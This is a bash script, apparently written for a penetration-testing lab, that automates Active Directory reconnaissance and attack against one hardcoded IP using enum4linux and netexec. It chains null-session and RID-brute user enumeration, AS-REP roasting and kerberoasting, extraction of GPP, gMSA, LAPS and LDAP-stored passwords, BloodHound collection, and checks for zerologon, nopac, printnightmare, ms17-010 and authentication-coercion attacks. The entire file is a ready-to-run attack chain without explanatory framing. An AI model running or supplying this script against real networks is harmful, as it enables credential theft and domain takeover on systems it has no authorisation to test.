ip="10.129.202.133"
username=""
password=""

# enum4linux
echo "=== enum4linux ==="
enum4linux -a -A -u "$username" -p "$password" "$ip" 

# netexec 
echo "=== NETEXEC ==="

echo "[*] Enum smb with netexec (null session)..." 
netexec smb $ip -u '' -p '' --shares 
netexec smb $ip -u 'guest' -p '' --shares 

if [[ -n "$username" ]]; then
	echo "[*] Basic auth permission ..." 
	netexec smb $ip -u "$username" -p "$password"   
	netexec winrm $ip -u "$username" -p "$password"  
	netexec rdp $ip -u "$username" -p "$password"    
	netexec mssql $ip -u "$username" -p "$password"  

	echo "[*] Enum smb share folder ..." 
	netexec smb $ip -u "$username" -p "$password" --shares 
	
	echo "[*] Enum gpp_autologin via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_autologin 
	
	echo "[*] Enum gpp_password via smb ..." 
	netexec smb $ip -u "$username" -p "$password" -M gpp_password  
	
	echo "[*] Enum gmsa password ..." 
	netexec ldap $ip -u "$username" -p "$password" --gmsa 
	
	echo "[*] Bloodhound collecting ..." 
	netexec ldap $ip -u "$username" -p "$password" --bloodhound -c all 
	
	echo "[*] Enum asreproast ..." 
	netexec ldap $ip -u "$username" -p "$password" --asreproast __netexec_asreproast.txt 
	
	echo "[*] Enum kerberoasting ..." 
	netexec ldap $ip -u "$username" -p "$password" --kerberoasting __netexec_kerberoasting.txt 
	
	echo "[*] ldap-checker via ldap ..." 
	netexec ldap $ip -u "$username" -p "$password" -M ldap-checker 
	
	echo "[*] Attack : webdav ..." 
	netexec smb $ip -u "$username" -p "$password" -M webdav 
	
	echo "[*] Attack : printnightmare ..." 
	netexec smb $ip -u "$username" -p "$password" -M printnightmare 
	
else
	echo "[*] Enum user via ldap (null session)..." 
	netexec ldap $ip -u '' -p '' --users 
	
	echo "[*] Rid brute via null session(limit to 10000)..." 
	netexec smb $ip -u '' -p '' --rid-brute 10000 
	
	echo "[*] Rid brute via guest account (limit to 10000)..." 
	netexec smb $ip -u 'guest' -p '' --rid-brute 10000 
	
fi

echo "[*] Attack : spooler ..." 
netexec smb $ip -u "$username" -p "$password" -M spooler 

echo "[*] Attack : dfscoerce ..." 
netexec smb $ip -u "$username" -p "$password" -M dfscoerce 

echo "[*] Attack : shadowcoerce ..." 
netexec smb $ip -u "$username" -p "$password" -M shadowcoerce 

echo "[*] Attack : printerbug ..." 
netexec smb $ip -u "$username" -p "$password" -M printerbug 

echo "[*] Attack : nopac ..." 
netexec smb $ip -u "$username" -p "$password" -M nopac 

echo "[*] Attack : zerologon ..." 
netexec smb $ip -u "$username" -p "$password" -M zerologon 

echo "[*] Attack : ms17-010 ..." 
netexec smb $ip -u "$username" -p "$password" -M ms17-010 

echo "[*] ioxidresolver ..." 
netexec smb $ip -u "$username" -p "$password" -M ioxidresolver 

echo "[*] enum av via smb ..." 
netexec smb $ip -u "$username" -p "$password" -M enum_av 

echo "[*] Enum ADCS ..." 
netexec ldap $ip -u "$username" -p "$password" -M adcs 
netexec smb $ip -u "$username" -p "$password" -M enum_ca 

echo "[*] Enum enum_trusts ..." 
netexec ldap $ip -u "$username" -p "$password" -M enum_trusts 

echo "[*] Enum password-not-required ..." 
netexec ldap $ip -u "$username" -p "$password" --password-not-required 

echo "[*] Enum trusted for delegation ..." 
netexec ldap $ip -u "$username" -p "$password" --trusted-for-delegation 

echo "[*] Enum pre 2000 computer  ..." 
netexec ldap $ip -u "$username" -p "$password" --query "(userAccountControl=4128)" "sAMAccountName" 

echo "[*] Get-desc-users via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-desc-users 

echo "[*] get-unixUserPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-unixUserPassword 

echo "[*] get-userPassword via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M get-userPassword 

echo "[*] laps via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M laps 

echo "[*] MachineAccountQuota via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M maq 

echo "[*] obsolete via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M obsolete 

echo "[*] pso via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M pso 

echo "[*] subnets via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M subnets 

echo "[*] user-desc via ldap ..." 
netexec ldap $ip -u "$username" -p "$password" -M user-desc 

